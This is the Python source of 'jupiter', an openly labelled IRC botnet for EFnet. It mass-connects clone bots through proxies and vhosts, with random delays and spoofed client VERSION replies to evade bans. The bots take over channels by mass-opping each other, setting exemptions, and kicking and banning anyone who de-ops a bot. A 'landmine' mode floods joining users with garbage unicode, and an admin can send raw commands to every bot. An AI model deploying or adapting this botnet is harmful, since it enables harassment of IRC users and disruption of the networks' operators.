#!/usr/bin/env python
# jupiter: internet relay chat botnet for efnet - developed by acidvegas in python (https://git.acid.vegas/jupiter)

''' A M P L I S S I M U S   M A C H I N A '''

'''
03:12:44 | [!] - Unexpected error occured on 'irc.prison.net' server. (Exception('Banned'))
03:12:53 | [!] - Unexpected error occured on 'efnet.port80.se' server. (Exception('Banned'))
03:06:07 | [!] - Unexpected error occured on 'efnet.deic.eu' server. (IncompleteReadError('0 bytes read on a total of undefined expected bytes'))
03:05:56 | [!] - Unexpected error occured on 'irc.colosolutions.net' server. (Exception('Banned'))
03:05:17 | [!] - Failed to connect to 'irc.choopa.net' IRC server on port 9000 using SSL/TLS (SSLError(1, '[SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1123)'))

'''

import asyncio
import copy
import os
import random
import re
import socket
import ssl
import sys
import time

try:
	import aiosocks
except ImportError:
	raise SystemExit('Error: aiosocks module not installed! (pip install aiosocks)')

# Connection
servers = (
	{'server':'efnet.deic.eu',         'ssl':6697, 'ipv6': True},
	{'server':'efnet.port80.se',       'ssl':6697, 'ipv6': True},
   #{'server':'efnet.portlane.se',     'ssl':6697, 'ipv6': True}, # Removed (efnet.portlane.se is an alias for irc.efnet.org)
	{'server':'irc.choopa.net',        'ssl':9000, 'ipv6': True},
	{'server':'irc.colosolutions.net', 'ssl':None, 'ipv6':False}, # error: SSL handshake failed: unsafe legacy renegotiation disabled
   #{'server':'irc.deft.com',          'ssl':None, 'ipv6':False}, # Removed (irc.deft.com points to irc.servercentral.net)
	{'server':'irc.du.se',             'ssl':None, 'ipv6':False}, # error: handshake failed: dh key too small
   #{'server':'irc.efnet.fr',          'ssl':6697, 'ipv6': True}, # Removed (irc.efnet.fr is an alias for irc.efnet.nl)
	{'server':'irc.efnet.nl',          'ssl':6697, 'ipv6': True},
	{'server':'irc.homelien.no',       'ssl':6697, 'ipv6': True},
	{'server':'irc.mzima.net',         'ssl':6697, 'ipv6': True},
   #{'server':'irc.nordunet.se',       'ssl':6697, 'ipv6': True}, # Removed (irc.nordunet.se is an alias for irc.swepipe.se)
	{'server':'irc.prison.net',        'ssl':None, 'ipv6':False},
	{'server':'irc.swepipe.se',        'ssl':6697, 'ipv6': True},
	{'server':'irc.underworld.no',     'ssl':6697, 'ipv6': True},
	{'server':'irc.servercentral.net', 'ssl':9999, 'ipv6':False}
)
ipv6     = True # Set to False if your system does not have an IPv6 address
channel  = '#jupiter'
backup   = '#jupiter-' + str(random.randint(1000,9999)) # Use /list -re #jupiter-* on weechat to find your bots
key      = 'xChangeMex'

# Settings
admin           = 'nick!user@host' # Can use wildcards (Must be in nick!user@host format)
connect_delay   = True 		       # Random delay between 5-15 minutes before connecting a clone to a server
concurrency     = 3                # Number of clones to load per server
id              = 'TEST'           # Unique ID so you can tell which bots belong what server

# Formatting Control Characters / Color Codes
bold        = '\x02'
reset       = '\x0f'
green       = '03'
red         = '04'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'

# Globals
bots     = list()
callerid = list()

def botcontrol(action, data, ci=False):
	global bots, callerid
	if action == '+':
		if ci:
			if data not in callerid:
				callerid.append(data)
		else:
			if data not in bots:
				bots.append(data)
	elif action == '-':
		if ci:
			if data in callerid:
				callerid.remove(data)
		else:
			if data in bots:
				bots.remove(data)

def color(msg, foreground, background=None):
	return f'\x03{foreground},{background}{msg}{reset}' if background else f'\x03{foreground}{msg}{reset}'

def debug(data):
	print('{0} | [~] - {1}'.format(time.strftime('%I:%M:%S'), data))

def error(data, reason=None):
	print('{0} | [!] - {1} ({2})'.format(time.strftime('%I:%M:%S'), data, str(repr(reason)))) if reason else print('{0} | [!] - {1}'.format(time.strftime('%I:%M:%S'), data))

def is_admin(ident):
	return re.compile(admin.replace('*','.*')).search(ident)

def rndnick():
	prefix = random.choice(['st','sn','cr','pl','pr','fr','fl','qu','br','gr','sh','sk','tr','kl','wr','bl']+list('bcdfgklmnprstvwz'))
	midfix = random.choice(('aeiou'))+random.choice(('aeiou'))+random.choice(('bcdfgklmnprstvwz'))
	suffix = random.choice(['ed','est','er','le','ly','y','ies','iest','ian','ion','est','ing','led','inger']+list('abcdfgklmnprstvwz'))
	return prefix+midfix+suffix

def ssl_ctx():
	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE
	return ctx

def unicode():
	msg='\u202e\u0007\x03' + str(random.randint(2,14))
	for i in range(random.randint(150, 200)):
		msg += chr(random.randint(0x1000,0x3000))
	return msg

class clone():
	def __init__(self, server, vhost=None, proxy=None, use_ipv6=False):
		self.server     = server
		self.vhost      = vhost
		self.proxy      = proxy
		self.use_ipv6   = use_ipv6
		self.ssl_status = True
		self.nickname   = rndnick()
		self.host       = self.nickname + '!*@*'
		self.monlist    = list()
		self.landmine   = None
		self.relay      = None
		self.loop       = None
		self.reader     = None
		self.writer     = None

	async def connect(self):
		while True:
			try:
				if connect_delay:
					await asyncio.sleep(random.randint(300,900))
				if self.proxy:
					options = {
						'proxy'      : aiosocks.Socks5Addr(self.proxy.split(':')[0], int(self.proxy.split(':')[1])),
						'proxy_auth' : None,
						'dst'        : (self.server['server'], self.server['ssl'] if self.server['ssl'] and self.ssl_status else 6667),
						'limit'      : 1024,
						'ssl'        : ssl_ctx() if self.server['ssl'] and self.ssl_status else None,
						'family'     : 2
					}
					self.reader, self.writer = await asyncio.wait_for(aiosocks.open_connection(**options), 15)
				else:
					options = {
						'host'       : self.server['server'],
						'port'       : self.server['ssl'] if self.server['ssl'] and self.ssl_status else 6667,
						'limit'      : 1024,
						'ssl'        : ssl_ctx() if self.server['ssl'] and self.ssl_status else None,
						'family'     : socket.AF_INET6 if self.use_ipv6 else socket.AF_INET,
						'local_addr' : (self.vhost, random.randint(5000,60000)) if self.vhost else None
					}
					self.reader, self.writer = await asyncio.wait_for(asyncio.open_connection(**options), 15)
					await self.raw(f'USER {rndnick()} 0 * :{rndnick()}')
					await self.raw('NICK ' + self.nickname)
			except Exception as ex:
				v6 = 'using IPv6 ' if self.use_ipv6 else ''
				if self.ssl_status and self.server['ssl']:
					self.ssl_status = False
					error('Failed to connect to \'{0}\' IRC server {1}on port {2} using SSL/TLS'.format(self.server['server'], v6, str(self.server['ssl'])), ex)
				else:
					if not self.ssl_status and self.server['ssl']:
						self.ssl_status = True
					error('Failed to connect to \'{0}\' IRC server {1}'.format(self.server['server'], v6), ex)
			else:
				await self.listen()
			finally:
				await asyncio.sleep(86400+random.randint(1800,3600))

	async def event_message(self, ident, nick, target, msg):
		if target == self.relay:
			await asyncio.sleep(0.5)
			await self.sendmsg(channel, '[{0}] <{1}>: {2}'.format(color(target, cyan), color(nick[:15].ljust(15), purple), msg))
		if is_admin(ident):
			args = msg.split()
			if args[0] in ('@all',self.nickname) and len(args) >= 2:
				if len(args) == 2:
					if args[1] == 'id':
						await self.sendmsg(target, id)
					elif args[1] == 'sync' and args[0] == self.nickname: # NOTE: Do we need sync? Seems to work without it... (sync adds admin to botlist and wont +o swarm everyone if you +o a bot)
						await self.raw('WHO ' + channel)
				elif len(args) == 3:
					if args[1] == '5000':
						chan = args[2]
						if chan == 'stop':
							self.landmine = None
							await self.sendmsg(channel, '5000 mode turned off')
						elif chan[:1] == '#':
							self.landmine = chan
							await self.sendmsg(channel, '5000 mode actived on ' + color(chan, cyan))
					elif args[1] == 'monitor':
						if args[2] == 'list' and self.monlist:
							await self.sendmsg(target, '[{0}] {1}'.format(color('Monitor', light_blue), ', '.join(self.monlist)))
						elif args[2] == 'reset' and self.monlist:
							await self.monitor('C')
							self.monlist = list()
							await self.sendmsg(target, '{0} nick(s) have been {1} from the monitor list.'.format(color(str(len(self.monlist)), cyan), color('removed', red)))
						elif args[2][:1] == '+':
							nicks = [mon_nick for mon_nick in set(args[2][1:].split(',')) if mon_nick not in self.monlist]
							if nicks:
								await self.monitor('+', nicks)
								self.monlist += nicks
								await self.sendmsg(target, '{0} nick(s) have been {1} to the monitor list.'.format(color(str(len(nicks)), cyan), color('added', green)))
						elif args[2][:1] == '-':
							nicks = [mon_nick for mon_nick in set(args[2][1:].split(',')) if mon_nick in self.monlist]
							if nicks:
								await self.monitor('-', nicks)
								for mon_nick in nicks:
									self.monlist.remove(mon_nick)
								await self.sendmsg(target, '{0} nick(s) have been {1} from the monitor list.'.format(color(str(len(nicks)), cyan), color('removed', red)))
					elif args[1] == 'relay' and args[0] == self.nickname:
						chan = args[2]
						if chan == 'stop':
							self.relay = None
							await self.sendmsg(channel, 'Relay turned off')
						elif chan[:1] == '#':
							self.relay = chan
							await self.sendmsg(channel, 'Monitoring ' + color(chan, cyan))
				elif len(args) >= 4 and args[1] == 'raw':
					if args[2] == '-d':
						data = ' '.join(args[3:])
						self.loops = asyncio.create_task(self.raw(data,True))
					else:
						data = ' '.join(args[2:])
						await self.raw(data)
		elif target == self.nickname:
			if msg.startswith('\x01ACTION'):
				await self.sendmsg(channel, '[{0}] {1}{2}{3} * {4}'.format(color('PM', red), color('<', grey), color(nick, yellow), color('>', grey), msg[8:][:-1]))
			else:
				await self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('PM', red), color('<', grey), color(nick, yellow), color('>', grey), msg))

	async def event_mode(self, nick, chan, modes):
		if chan == backup and modes == '+nt' and key:
			await self.mode(backup, '+mk' + key)
		elif ('e' in modes or 'I' in modes) and self.host in modes:
			if nick not in bots:
				await self.mode(chan, f'+eI *!*@{self.host} *!*@{self.host}') # Quick and dirty +eI recovery
		else:
			nicks = modes.split()[1:]
			modes = modes.split()[0]
			if 'o' in modes:
				state = None
				op = False
				lostop = list()
				for item in modes:
					if item in ('+-'):
						state = item
					else:
						if nicks:
							current = nicks.pop(0)
							if current == self.nickname and item == 'o':
								op = True if state == '+' else False
							elif current in bots and item == 'o' and state == '-':
								lostop.append(current)
				if op:
					if nick not in bots:
						_bots = copy.deepcopy(bots)
						random.shuffle(_bots)
						_bots = [_bots[i:i+4] for i in range(0, len(_bots), 4)]
						for clones in _bots:
							await self.mode(chan, '+oooo ' + ' '.join(clones))
					await self.mode(chan, f'+eI *!*@{self.host} *!*@{self.host}')
					await self.mode(chan, f'+eI {unicode()[:10]}!{unicode()[:10]}@{unicode()[:10]} {unicode()[:10]}!{unicode()[:10]}@{unicode()[:10]}')
				elif lostop:
					await self.mode(chan, '+' + 'o'*len(lostop) + ' ' + ' '.join(lostop))
					await self.raw(f'KICK {chan} {nick} {unicode()}')
					await self.mode(chan, f'+b {nick}!*@*')
					await self.sendmsg(chan, f'{unicode()} oh god what is happening {unicode()}')
			#await self.mode(chan, '+eeee ')                     # Set +b exemption on bots
			#await self.mode(chan, '+IIII ')                     # Set +I exemption on bots
			#await self.mode(chan, '+imk ' + random.randint(1000,9999)
			#await self.raw('KICK {chan} {nick} {unicode()}')    # Kick everyone using unifuck as the kick reason
			#await self.mode(chan, '+bbbb ')                     # Ban every user
			#await self.mode(chan, '+bbb *!*@* *!*@*.* *!*@*:*') # Ban everyone

	async def listen(self):
		while not self.reader.at_eof():
			try:
				data = await asyncio.wait_for(self.reader.readuntil(b'\r\n'), 600)
				line = data.decode('utf-8').strip()
				args = line.split()
				if line.startswith('ERROR :Closing Link:'):
					raise Exception('Banned')
				elif line.startswith('ERROR :Reconnecting too fast'):
					raise Exception('Throttled')
				elif args[0] == 'PING':
					await self.raw('PONG ' + args[1][1:])
				elif args[1] == '001': # RPL_WELCOME
					if self.monlist:
						await self.monitor('+', self.monlist)
					await self.raw(f'JOIN {channel} {key}') if key else await self.raw('JOIN ' + channel)
					await self.raw(f'JOIN {backup}  {key}') if key else await self.raw('JOIN ' +  backup)
				elif args[1] == '315': # RPL_ENDOFWHO
					await self.sendmsg(channel, 'Sync complete')
				elif args[1] == '352' and len(args) >= 8: # RPL_WHOREPLY
					nick = args[7]
					botcontrol('+',nick)
				elif args[1] == '433' and len(args) >= 4: # ERR_NICKNAMEINUSE
					nick = args[2]
					target_nick = args[3]
					if nick == '*':
						self.nickname = rndnick()
						await self.nick(self.nickname)
				elif args[1] == '465': # ERR_YOUREBANNEDCREEP
					error('K-Lined', self.server)
				elif args[1] in ('716','717'): # RPL_TARGNOTIFY
					nick = args[2] #TODO: verify this is the correct arguement
					botcontrol(nick, '+', True)
				elif args[1] == '731' and len(args) >= 4: # RPL_MONOFFLINE
					nick = args[3][1:]
					await self.nick(nick)
				elif args[1] == 'JOIN' and len(args) == 3:
					nick = args[0].split('!')[0][1:]
					host = args[0].split('@')[1]
					chan = args[2][1:]
					if chan == self.landmine:
						await self.sendmsg(chan, f'{unicode()} oh god {nick} what is happening {unicode()}')
						await self.sendmsg(nick, f'{unicode()} oh god {nick} what is happening {unicode()}')
					elif chan == channel:
						botcontrol('+', nick)
						if nick == self.nickname:
							self.host = host
				elif args[1] == 'KICK' and len(args) >= 4:
					chan = args[2]
					nick = args[3]
					if nick == self.nickname:
						await asyncio.sleep(3)
						await self.raw('JOIN ' + chan)
				elif args[1] == 'MODE' and len(args) >= 4:
					nick  = args[0].split('!')[0][1:]
					chan  = args[2]
					modes = ' '.join(args[3:])
					await self.event_mode(nick, chan, modes)
				elif args[1] == 'NICK' and len(args) == 3:
					nick = args[0].split('!')[0][1:]
					new_nick = args[2][1:]
					if nick == self.nickname:
						botcontrol('-', nick)
						botcontrol('+', new_nick)
						self.nickname = new_nick
						if self.nickname in self.monlist:
							await self.monitor('C')
							self.monlist = list()
					elif nick in self.monlist:
						await self.nick(nick)
					elif nick in bots:
						botcontrol('-', nick)
						botcontrol('+', new_nick)
				elif args[1] == 'NOTICE':
					nick   = args[0].split('!')[0][1:]
					target = args[2]
					msg    = ' '.join(args[3:])[1:]
					if target == self.nickname:
						if '!' not in args[0] and 'Blacklisted Proxy found' in line:
							error('Blacklisted IP', line)
						elif 'You are now being scanned for open proxies' in line:
							pass # We can ignore these & not relay them into the channel
						else:
							await self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('NOTICE', purple), color('<', grey), color(nick, yellow), color('>', grey), msg))
				elif args[1] == 'PRIVMSG' and len(args) >= 4:
					ident  = args[0][1:]
					nick   = args[0].split('!')[0][1:]
					target = args[2]
					msg    = ' '.join(args[3:])[1:]
					if msg[:1] == '\001':
						msg = msg[1:-1]
						if target == self.nickname:
							if msg == 'VERSION':
								version = random.choice(['http://www.mibbit.com ajax IRC Client','mIRC v6.35 Khaled Mardam-Bey','xchat 0.24.1 Linux 2.6.27-8-eeepc i686','rZNC Version 1.0 [02/01/11] - Built from ZNC','thelounge v3.0.0 -- https://thelounge.chat/'])
								await self.raw(f'NOTICE {nick} \001VERSION {version}\001')
							else:
								await self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('CTCP', green), color('<', grey), color(nick, yellow), color('>', grey), msg))
					else:
						await self.event_message(ident, nick, target, msg)
				elif args[1] == 'QUIT':
					nick = args[0].split('!')[0][1:]
					if nick in self.monlist:
						await self.nick(nick)
					elif nick in bots:
						botcontrol('-', nick)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except Exception as ex:
				error('Unexpected error occured on \'{0}\' server.'.format(self.server['server']), ex)
				try:
					self.loop.cancel()
				except:
					pass
				break

	async def mode(self, target, mode):
		await self.raw(f'MODE {target} {mode}')

	async def monitor(self, action, nicks=list()):
		await self.raw(f'MONITOR {action} ' + ','.join(nicks))

	async def nick(self, nick):
		await self.raw('NICK ' + nick)

	async def raw(self, data, delay=False):
		try:
			if delay:
				await asyncio.sleep(random.randint(60,300))
			self.writer.write(data[:510].encode('utf-8') + b'\r\n')
			await self.writer.drain()
		except asyncio.CancelledError:
			pass

	async def sendmsg(self, target, msg):
		await self.raw(f'PRIVMSG {target} :{msg}')

async def main(option=None, input_data=None):
	jobs = list()
	for i in range(concurrency):
		for server in servers:
			if option and input_data:
				for item in input_data:
					if option == '-p':
						jobs.append(asyncio.ensure_future(clone(server, proxy=item).connect()))
					else:
						if ':' in item:
							jobs.append(asyncio.ensure_future(clone(server, vhost=item, use_ipv6=True).connect()))
						else:
							jobs.append(asyncio.ensure_future(clone(server, vhost=item).connect()))
					if ipv6 and server['ipv6']:
						jobs.append(asyncio.ensure_future(clone(server, use_ipv6=True).connect()))
			else:
				jobs.append(asyncio.ensure_future(clone(server).connect()))
				if ipv6 and server['ipv6']:
					jobs.append(asyncio.ensure_future(clone(server, True).connect()))
	await asyncio.gather(*jobs)

# Main
print('#'*56)
print('#{:^54}#'.format(''))
print('#{:^54}#'.format('Jupiter IRC botnet for EFnet'))
print('#{:^54}#'.format('Developed by acidvegas in Python'))
print('#{:^54}#'.format('https://git.acid.vegas/jupiter'))
print('#{:^54}#'.format(''))
print('#'*56)
if len(sys.argv) == 3:
	if (option := sys.argv[1]) in ('-p','-v'):
		input_file = sys.argv[2]
		if os.path.exists(input_file):
			input_data = open(input_file, 'r').read().split('\n')
			loop = asyncio.get_event_loop()
			loop.run_until_complete(main(option, input_data))
		else:
			raise SystemExit(f'Error: {input_file} does not exist!')
else:
	loop = asyncio.get_event_loop()
	loop.run_until_complete(main())
